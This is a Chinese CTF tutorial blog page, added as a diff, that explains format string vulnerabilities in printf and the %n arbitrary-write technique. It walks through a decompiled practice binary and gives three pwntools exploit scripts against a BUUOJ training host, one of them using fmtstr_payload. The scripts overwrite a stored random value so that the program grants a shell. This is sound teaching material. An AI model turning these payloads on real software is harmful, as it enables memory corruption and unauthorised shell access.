@@ -1,0 +1,115 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>格式化字符串基础漏洞 | Chen</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>格式化字符串基础漏洞</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2022-09-22T13:55:33.000Z" id="date"> 2022-09-22</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-10-12T02:26:22.143Z" id="updated"> 2022-10-12</time></div></span></div></div><hr><div id="post-content"><h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>printf应该是我们学习c语言起使用的最频繁的函数了</p>
+<p>其语法我们熟悉的不能再熟悉了—&gt;<strong>printf (“格式化字符串”,参量… )</strong></p>
+<p>我们可以写一段代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n=<span class="number">5</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当然我们也可以这样写：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> a[]=<span class="string">&quot;chen&quot;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第二种写法虽然没有格式化字符但是仍然可以输出chen这个字符串</p>
+<p>那我们再看看第三种写法</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> a[]=<span class="string">&quot;%x%x%x&quot;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这次我们没有给printf函数参数，只是仅仅给他格式化字符，猜一下，这次能成功吗，如果成功了，会输出什么？</p>
+<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/IsjzF"><img src="https://s1.328888.xyz/2022/09/22/IsjzF.png" alt="IsjzF.png"></a></p>
+<p>输出了像地址的16进制？</p>
+<p>我们明明没有给他用以输出的参数，那么这串数据是从哪里来的？</p>
+<p>我们用图来表示一下printf输出的时候栈结构是什么样子</p>
+<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/IssF7"><img src="https://s1.328888.xyz/2022/09/22/IssF7.png" alt="IssF7.png"></a></p>
+<p><strong>ps:关于这图，格式化字符串不一定要放在栈顶才能实现任意地址写入，注意别被误导了，下面会提一嘴</strong></p>
+<p>如果我们只传入了格式化字符串而没有传入参数</p>
+<p>那么格式化字符串仍然会遵循着原先的逻辑，向高地址处逐个字长的输出当前栈的内容&#x2F;指针(输出的方式根据其格式化字符的不同而不同)</p>
+<p><strong>这是因为printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束</strong></p>
+<p>pwn题中的格式化字符串通常有两种出法</p>
+<p>第一种，使用格式化字符串泄露栈上的内容(canary或者是随机数不一定)，由于wp分类中的HUBU2022.fmt已经是这方面的例题了，这里不做额外的讲解，感兴趣的可以去wp分区中自行查看</p>
+<p>第二种，也是难度较前者稍高，不好理解的一种</p>
+<h2 id="任意内存的读取及任意内存写入"><a href="#任意内存的读取及任意内存写入" class="headerlink" title="任意内存的读取及任意内存写入"></a>任意内存的读取及任意内存写入</h2><p>我们首先得了解一个不常用的格式化字符串**%n**</p>
+<p>他的作用是将在其之前打印出来的字节数赋值给指定的变量</p>
+<p>比如: AAAA%n 就会赋值4给变量</p>
+<p>如果我们后面跟上要修改的变量地址，就可以做到任意地址的写入</p>
+<p>没懂？没关系来看一道例题</p>
+<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/IUys5"><img src="https://s1.328888.xyz/2022/09/23/IUys5.png" alt="IUys5.png"></a></p>
+<p>开了canary保护，大概率是格式化字符串</p>
+<p>看看ida</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的&#x2F;dev&#x2F;urandom是什么？</p>
+<p>我们只需要了解他是linux系统中的随机伪设备，他的作用就是提供永不为空的随机字节流</p>
+<p>浅看一下他生成的字节流长什么样子</p>
+<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/IxFMw"><img src="https://s1.328888.xyz/2022/09/23/IxFMw.png" alt="IxFMw.png"></a></p>
+<p>说回这道题，看逻辑应该是要我们输入这个随机数，如果一样就调用system(&#x2F;bin&#x2F;sh)</p>
+<p>而存放这个随机数的就是dword_804C044的地址</p>
+<p>那我们这时候应该有两种想法，一种是泄露这个随机数，输入他</p>
+<p>还有一种是通过修改这个随机数的值来判定成功</p>
+<p>第一种办法本人是没法做出来，感兴趣的可以试一试</p>
+<p>那么讲一下第二种办法，由上文的学习我们已经知道</p>
+<p>要想用格式化字符串漏洞泄露栈上的内容，需要我们知道目标地址和格式化字符串存放的地址的偏移</p>
+<p>用gdb看一下偏移</p>
+<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/Ix5SC"><img src="https://s1.328888.xyz/2022/09/23/Ix5SC.png" alt="Ix5SC.png"></a></p>
+<p>现在main函数处设置一个断点(这里由于main函数被删符号表了，所以b main的话gdb查找不到函数的，删符号表的体现就是在ida中main函数不是粗体字，ida只是凭借逻辑识别他为main函数)</p>
+<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/IxoJB"><img src="https://s1.328888.xyz/2022/09/23/IxoJB.png" alt="IxoJB.png"></a></p>
+<p>接着运行并且跳转到输入字符串这边，我们先输入8个A看一下栈分布的情况</p>
+<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/IxV3P"><img src="https://s1.328888.xyz/2022/09/23/IxV3P.png" alt="IxV3P.png"></a></p>
+<p>这里还是先解释一下x&#x2F;20wx $esp这个命令是什么意思</p>
+<p>其作用是用gdb查看内存 格式: x &#x2F;n u f <addr > </p>
+<p>n是要显示的内存单元个数</p>
+<p>f表示显示方式, 可取如下值</p>
+<p>u表示一个地址单元的长度</p>
+<p>这里的x&#x2F;20wx 的意思就是说查看20个4字节长度的内存单元 并且按16进制的格式显示</p>
+<p>至于为什么是以esp为初始地址显示</p>
+<p><strong>是因为格式化字符串%n进行任意地址改写是在ESP所指向的地址处所指向的地址处写入数据(可以理解为栈顶)</strong></p>
+<p>所以我们需要知道当我们最终构造的payload中需要改写的地址内容距离esp的偏移是多少</p>
+<p>而且也正是因为这一点，决定了我们可以不用一定要把格式化字符串放在栈顶</p>
+<p>这里可以看到代表着AAAAAAAA的两个0x4141414141距离esp的偏移是10和11(如果我们只输入4个A只会占用偏移10这个字长，因为这是32位程序，等下编写exp的不要被搞晕了)</p>
+<p>所以此时我们要如何构造我们的payload？</p>
+<p>此时我们将格式化字符放在payload的最后</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25117</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">addr = <span class="number">0x0804C044</span></span><br><span class="line">payload = p32(addr)+<span class="string">b&quot;%10$n&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>由于此时程序是32位，%n前面传入的p32(addr)则为一个字长，四个字节，所以此时addr处的随机数就被我们修改为4</p>
+<p>我们接着再输入4，就成功破解了随机数</p>
+<p>学会了？觉得很简单？再来看一个比较绕的exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25117</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">addr = <span class="number">0x0804C044</span></span><br><span class="line">payload = <span class="string">b&quot;AAAAAAA%13$n&quot;</span>+p32(addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;7&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这次我们把addr放在后面传输了，可以看到和上文的区别是前面多了7个A而且这次随机数被我们修改成7了</p>
+<p>看不懂没关系，接下来详解</p>
+<p>我们再次明确一下概念，这里提到的偏移指的是距离esp的字长数</p>
+<p>那么我们要实现改写的是addr这个地址的随机数对吧</p>
+<p>此时我们先传入的是字符串“AAAAAAA%13$n”他的字节数是多少？</p>
+<p>很明显是12个字节，也就是三个字长</p>
+<p>我们之前通过gdb已经明白了，我们写入栈中的第一个字长是位于10偏移处，也就是AAAA</p>
+<p>那么接下里的AAA%就会被写入11偏移</p>
+<p>13$n就会被写入12偏移</p>
+<p>而此时的addr就会被存放在13偏移处，所以此时我们的n就要从10更改为13</p>
+<p>似乎有点能理解了是吧？</p>
+<p>实际上pwntools中有一个函数，他可以自动帮我们生成这样的payload，而我们要做到的只是给予他基本的参数</p>
+<p><strong>fmtstr_payload(offset, {addr: data})</strong></p>
+<p>offset就是我们需要更改内容的地址距离esp的偏移</p>
+<p>addr就是我们需要改写内容的地址</p>
+<p>data就是我们需要改写的数据</p>
+<p>来看一下接下来的exp可以怎么写</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25117</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your name:&quot;</span>)</span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;<span class="number">0x804C044</span>:<span class="number">1</span>&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your passwd:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们就这样轻易的将addr处的随机数更改为了1</p>
+<p>是不是比之前的两种payload构造办法简单许多？</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/09/23/ret2libc/">← Next ret2libc</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/09/21/Ret2shellcode/">Ret2shellcode Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Chen</a></h1><div id="description"><p>ChenBlog</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">格式化字符串漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E7%9A%84%E8%AF%BB%E5%8F%96%E5%8F%8A%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E5%86%99%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">任意内存的读取及任意内存写入</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
